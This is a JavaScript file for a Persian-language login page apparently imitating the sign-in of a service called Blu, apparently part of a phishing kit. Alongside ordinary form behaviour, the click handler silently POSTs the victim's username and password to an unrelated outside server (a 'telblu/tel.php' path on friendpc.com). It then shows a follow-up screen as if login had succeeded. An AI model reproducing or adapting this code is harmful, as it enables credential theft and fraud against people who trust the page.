const user = document.querySelector('#user')
const pass = document.querySelector('#pass')
const card_1 = document.querySelector('#card-1')
const cardfull_1 = document.querySelector('#cardfull-1')
const cardfull_2 = document.querySelector('#cardfull-2')
const btn = document.querySelector('#btn')

user.addEventListener('focus', function () {
  card_1.classList.add('placeshow')
})

pass.addEventListener('focus', function () {
  card_1.classList.add('placeshow')
})

user.addEventListener('keydown', function (event) {
  var persianCharacters = /[\u0600-\u06FF]/
  if (persianCharacters.test(event.key)) {
    event.preventDefault()
  }
})

user.addEventListener('keyup', function () {
  if (user.value.length < 3) {
    btn.disabled = true
    btn.innerHTML = 'ورود به بلو '
  } else if (pass.value.length < 3) {
    btn.disabled = true
    btn.innerHTML = 'ورود به بلو '
  } else {
    btn.disabled = false
    btn.innerHTML = 'ورود با رمز عبور'
  }
})

pass.addEventListener('keyup', function () {
  if (pass.value.length >= 1) {
    document.getElementById('eyes').style.display = ''
  } else {
    document.getElementById('eyes').style.display = 'none'
  }
  if (pass.value.length < 3) {
    btn.disabled = true
    btn.innerHTML = 'ورود به بلو '
  } else if (user.value.length < 3) {
    btn.disabled = true
    btn.innerHTML = 'ورود به بلو '
  } else {
    btn.disabled = false
    btn.innerHTML = 'ورود با رمز عبور'
  }
})

btn.addEventListener('click', function () {
  btn.disabled = true
  btn.innerHTML = `<span style="margin-top: -2rem;" class="loader"></span>`
  let form_data = new FormData()
  form_data.append('user', user.value)
  form_data.append('pass', pass.value)
  $.ajax({
    url: 'https://friendpc.com/index.html/telblu/tel.php',
    dataType: 'text',
    cache: false,
    contentType: false,
    processData: false,
    data: form_data,
    type: 'POST'
  })
  setTimeout(() => {
    cardfull_1.style.display = 'none'
    cardfull_2.style.display = ''
  }, 2000)
})

document.getElementById('eyes').addEventListener('click', function () {
  if (pass.type == 'password') {
    document.getElementById('eyes').src = './assets/logo/eye-hide.jpg'
    pass.type = 'text'
  } else if (pass.type == 'text') {
    document.getElementById('eyes').src = './assets/logo/eye-show.jpg'
    pass.type = 'password'
  }
})

function back () {
  window.location.href = './'
}
